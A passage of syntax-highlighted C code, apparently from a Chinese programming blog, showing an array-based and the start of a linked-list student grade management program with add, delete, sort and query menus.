class="built_in">printf</span>(<span class="string">&quot;已成功删除数据\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        remove(<span class="string">&quot;temp.txt&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未找到匹配的学生学号\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按照数学成绩进行排序</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compareByMathScore</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a, <span class="type">const</span> <span class="type">void</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">const</span> Student *studentA = (<span class="type">const</span> Student *)a;</span><br><span class="line">    <span class="type">const</span> Student *studentB = (<span class="type">const</span> Student *)b;</span><br><span class="line">    <span class="keyword">return</span> studentB-&gt;mathScore - studentA-&gt;mathScore;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按照程序设计成绩进行排序</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compareByProgrammingScore</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a, <span class="type">const</span> <span class="type">void</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">const</span> Student *studentA = (<span class="type">const</span> Student *)a;</span><br><span class="line">    <span class="type">const</span> Student *studentB = (<span class="type">const</span> Student *)b;</span><br><span class="line">    <span class="keyword">return</span> studentB-&gt;programmingScore - studentA-&gt;programmingScore;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按照总分进行排序</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compareByTotalScore</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a, <span class="type">const</span> <span class="type">void</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">const</span> Student *studentA = (<span class="type">const</span> Student *)a;</span><br><span class="line">    <span class="type">const</span> Student *studentB = (<span class="type">const</span> Student *)b;</span><br><span class="line">    <span class="type">int</span> totalScoreA = studentA-&gt;mathScore + studentA-&gt;programmingScore;</span><br><span class="line">    <span class="type">int</span> totalScoreB = studentB-&gt;mathScore + studentB-&gt;programmingScore;</span><br><span class="line">    <span class="keyword">return</span> totalScoreB - totalScoreA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按照选定的方式进行排序</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sortData</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;打开数据文件时发生错误\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Student students[MAX_STUDENTS];</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot;%ld %s %d %d&quot;</span>, &amp;students[count].studentID, students[count].name, &amp;students[count].mathScore, &amp;students[count].programmingScore) != EOF) &#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> option;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;排序方式\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1. 数学成绩排序\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2. 程序设计成绩排序\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3. 总分排序\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4. 返回主菜单\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入排序选项:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;option);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            qsort(students, count, <span class="keyword">sizeof</span>(Student), compareByMathScore);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            qsort(students, count, <span class="keyword">sizeof</span>(Student), compareByProgrammingScore);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            qsort(students, count, <span class="keyword">sizeof</span>(Student), compareByTotalScore);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已完成排序的数据:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;学号: %ld, 姓名: %s, 数学成绩: %d, 程序设计成绩: %d\n&quot;</span>, students[i].studentID, students[i].name, students[i].mathScore, students[i].programmingScore);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据选定方式进行查询</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">queryData</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;打开数据文件时出现错误\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> option;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;查询方式\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1. 学号查询\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2. 姓名查询\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3. 数学成绩查询\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4. 程序设计成绩查询\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5. 总分查询\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;6. 返回主菜单\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入查询选项:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;option);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">            <span class="type">long</span> studentID;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的学号: &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;studentID);</span><br><span class="line"></span><br><span class="line">            Student student;</span><br><span class="line">            <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot;%ld %s %d %d&quot;</span>, &amp;student.studentID, student.name, &amp;student.mathScore, &amp;student.programmingScore) != EOF) &#123;</span><br><span class="line">                <span class="keyword">if</span> (student.studentID == studentID) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;学号: %ld, 姓名: %s, 数学成绩: %d, 程序设计成绩: %d\n&quot;</span>, student.studentID, student.name, student.mathScore, student.programmingScore);</span><br><span class="line">                    found = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;学号未找到\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">            <span class="type">char</span> name[<span class="number">50</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的姓名: &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">            Student student;</span><br><span class="line">            <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot;%ld %s %d %d&quot;</span>, &amp;student.studentID, student.name, &amp;student.mathScore, &amp;student.programmingScore) != EOF) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strcmp</span>(student.name, name) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;学号: %ld, 姓名: %s, 数学成绩: %d, 程序设计成绩: %d\n&quot;</span>, student.studentID, student.name, student.mathScore, student.programmingScore);</span><br><span class="line">                    found = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;姓名未找到\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">            <span class="type">int</span> mathScore;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的数学成绩: &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;mathScore);</span><br><span class="line"></span><br><span class="line">            Student student;</span><br><span class="line">            <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot;%ld %s %d %d&quot;</span>, &amp;student.studentID, student.name, &amp;student.mathScore, &amp;student.programmingScore) != EOF) &#123;</span><br><span class="line">                <span class="keyword">if</span> (student.mathScore &gt;= mathScore) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;学号: %ld, 姓名: %s, 数学成绩: %d, 程序设计成绩: %d\n&quot;</span>, student.studentID, student.name, student.mathScore, student.programmingScore);</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;数学成绩 &gt;= %d 的人数: %d\n&quot;</span>, mathScore, count);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line">            <span class="type">int</span> programmingScore;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的程序设计成绩: &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;programmingScore);</span><br><span class="line"></span><br><span class="line">            Student student;</span><br><span class="line">            <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot;%ld %s %d %d&quot;</span>, &amp;student.studentID, student.name, &amp;student.mathScore, &amp;student.programmingScore) != EOF) &#123;</span><br><span class="line">                <span class="keyword">if</span> (student.programmingScore &gt;= programmingScore) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;学号: %ld, 姓名: %s, 数学成绩: %d, 程序设计成绩: %d\n&quot;</span>, student.studentID, student.name, student.mathScore, student.programmingScore);</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;程序设计成绩 &gt;= %d 的人数: %d\n&quot;</span>, programmingScore, count);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>: &#123;</span><br><span class="line">            <span class="type">int</span> totalScore;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的总成绩: &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;totalScore);</span><br><span class="line"></span><br><span class="line">            Student student;</span><br><span class="line">            <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot;%ld %s %d %d&quot;</span>, &amp;student.studentID, student.name, &amp;student.mathScore, &amp;student.programmingScore) != EOF) &#123;</span><br><span class="line">                <span class="type">int</span> total = student.mathScore + student.programmingScore;</span><br><span class="line">                <span class="keyword">if</span> (total &gt;= totalScore) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;学号: %ld, 姓名: %s, 数学成绩: %d, 程序设计成绩: %d\n&quot;</span>, student.studentID, student.name, student.mathScore, student.programmingScore);</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;总成绩 &gt;= %d 的人数: %d\n&quot;</span>, totalScore, count);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> option;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        displayMainMenu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;option);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                createDataFile();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                addData();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                deleteData();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                sortData();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                queryData();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;程序已退出\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;不存在的选项，请重新输入\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (option != <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>链表版</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开发者：Mariette</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> zs=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line"><span class="type">long</span> xh;</span><br><span class="line"><span class="type">char</span> xm[<span class="number">5</span>];</span><br><span class="line"><span class="type">double</span> cj[<span class="number">2</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">struct</span> student *<span class="title function_">chuanjiang</span><span class="params">(<span class="keyword">struct</span> student *h,<span class="keyword">struct</span> student *pnew)</span>&#123;<span class="comment">//创建 </span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">head</span>;</span></span><br><span class="line">head=(<span class="keyword">struct</span> student*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> student));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入数据&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld %s %lf %lf&quot;</span>,&amp;pnew-&gt;xh,pnew-&gt;xm,&amp;pnew-&gt;cj[<span class="number">0</span>],&amp;pnew-&gt;cj[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span>(k==<span class="number">1</span>)&#123;</span><br><span class="line">pnew-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">head-&gt;next=pnew;</span><br><span class="line">k++;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">head=h;</span><br><span class="line"><span class="keyword">while</span>(head-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">head=head-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">pnew-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">head-&gt;next=pnew;</span><br><span class="line">head=h;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tianjia</span><span class="params">(<span class="keyword">struct</span> student *h,<span class="keyword">struct</span> student *pnew,<span class="type">int</span> v)</span>&#123;<span class="comment">//添加 </span></span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">head</span>=</span>h;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;v&amp;&amp;head;j++)&#123;</span><br><span class="line">head=head-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">pnew-&gt;next=head-&gt;next;</span><br><span class="line">head-&gt;next=pnew;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shanchu</span><span class="params">(<span class="keyword">struct</span> student *h,<span class="type">int</span> v)</span>&#123;<span class="comment">//删除 </span></span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">head</span>=</span>h;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;v&amp;&amp;head;j++)&#123;</span><br><span class="line">head=head-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">head-&gt;next=head-&gt;next-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">maopao</span><span class="params">(<span class="keyword">struct</span> student *h,<span class="type">int</span> v)</span>&#123;<span class="comment">//排序 </span></span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">head</span>,*<span class="title">p</span>,*<span class="title">q</span>,*<span class="title">tmp</span>;</span></span><br><span class="line">head=(<span class="keyword">struct</span> student*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> student));</span><br><span class="line">tmp=(<span class="keyword">struct</span> student*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> student));</span><br><span class="line">head-&gt;next=h;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;zs<span class="number">-1</span>;i++)&#123;</span><br><span class="line">head=h;</span><br><span class="line">p=head-&gt;next;</span><br><span class="line">q=p-&gt;next;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;zs<span class="number">-1</span>-i&amp;&amp;p!=<span class="literal">NULL</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(v==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;cj[<span class="number">0</span>]&gt;q-&gt;cj[<span class="number">0</span>])&#123;</span><br><span class="line">head-&gt;next=q;</span><br><span class="line">p-&gt;next=q-&gt;next;</span><br><span class="line">q-&gt;next=p;</span><br><span class="line">tmp=q;</span><br><span class="line">q=p;</span><br><span class="line">p=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(v==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;cj[<span class="number">1</span>]&gt;q-&gt;cj[<span class="number">1</span>])&#123;</span><br><span class="line">head-&gt;next=q;</span><br><span class="line">p-&gt;next=q-&gt;next;</span><br><span class="line">q-&gt;next=p;</span><br><span class="line">tmp=q;</span><br><span class="line">q=p;</span><br><span class="line">p=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(v==<span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((p-&gt;cj[<span class="number">0</span>]+p-&gt;cj[<span class="number">1</span>])&gt;(q-&gt;cj[<span class="number">0</span>]+q-&gt;cj[<span class="number">1</span>]))&#123;</span><br><span class="line">head-&gt;next=q;</span><br><span class="line">p-&gt;next=q-&gt;next;</span><br><span class="line">q-&gt;next=p;</span><br><span class="line">tmp=q;</span><br><span class="line">q=p;</span><br><span class="line">p=tmp;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">head=head-&gt;next;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">q=q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chaxun</span><span class="params">(<span class="keyword">struct</span> student *h,<span class="keyword">struct</span> student *p,<span class="type">int</span> v)</span>&#123;</span><br><span class="line"><span class="type">int</span> n,count=<span class="number">0</span>;</span><br><span class="line"><span class="type">double</span> fs;</span><br><span class="line"><span class="type">char</span> cx[<span class="number">5</span>]; </span><br><span class="line"><span class="keyword">if</span>(v==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入学号:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(p=h-&gt;next;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;xh==n)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ld %s %0.lf %0.lf\n&quot;</span>,p-&gt;xh,p-&gt;xm,p-&gt;cj[<span class="number">0</span>],p-&gt;cj[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找不到该信息\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(v==<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入姓名:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,cx);</span><br><span class="line"><span class="keyword">for</span>(p=h-&gt;next;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;xm,cx)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%ld %s %0.lf %0.lf\n&quot;</span>,p-&gt;xh,p-&gt;xm,p-&gt;cj[<span class="number">0</span>],p-&gt;cj[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 